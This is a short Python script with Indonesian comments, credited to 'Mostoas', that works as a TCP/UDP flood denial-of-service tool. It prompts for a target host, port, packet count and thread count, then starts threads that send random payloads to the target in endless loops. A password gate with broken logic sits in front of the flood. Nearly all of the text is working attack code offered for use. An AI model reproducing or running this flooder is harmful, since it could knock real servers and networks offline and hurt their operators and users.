#!/usr/bin/env python3
#Yaaa berhasil lu decompile
#mau lu rename? cantumkan nama yang buat
#Coded By Mostoas
import random
import socket
import threading
import os
import time

print("""\033[93m Hayoo Gatau Password nya Yaaa? \033[93m""")

password ="senang"

for i in range(3):
	pwd = input("\033[91m===> Enter Password : ")
	j=3
	if(pwd==password):
		time.sleep(3)
		print("\033[91m===> Password Benar !! ")
		break
	else:
		time.sleep(5)
		print("\033[91m===> Password Salah !!  ")
		continue
time.sleep(3)
print("\033[91m> Terlalu Banyak Salah Memasukan Password !!!")
os.system("clear")

print("\033[90m")
print("Please Tunggu!! ")
time.sleep(7)
os.system("clear")
print("\033[93m")

os.system("clear")
print("\033[95m Coded By Mostoas \033[95m")
print("\033[95m TCP/UDP FLOOD \033[95m")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(20179)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
	data = random._urandom(811)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" HAYOOOO NGAPAIN TUU...")
		except:
			s.close()
			print("[*] SERVER DAH MT")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()